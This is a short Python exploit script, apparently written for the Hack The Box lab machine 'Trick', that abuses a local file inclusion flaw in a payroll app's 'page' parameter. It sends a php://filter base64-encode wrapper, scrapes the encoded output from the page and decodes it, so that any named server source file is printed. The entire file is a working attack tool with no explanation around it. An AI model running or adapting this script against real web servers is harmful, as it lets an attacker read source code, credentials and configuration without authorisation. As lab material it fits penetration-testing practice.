import requests as r
import base64
import re
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--file', help="get preprod-payroll server source files.")
args = parser.parse_args()

host = 'http://preprod-payroll.trick.htb'

rspn = r.get(f"{host}/index.php?page=php://filter/convert.base64-encode/resource={args.file}", allow_redirects=False)
filter_b64 = re.findall(r'<main id="view-panel" >\s+(.*?)\s+</main>', rspn.text)
source = base64.b64decode(filter_b64[0]).decode("UTF-8")
print(source)

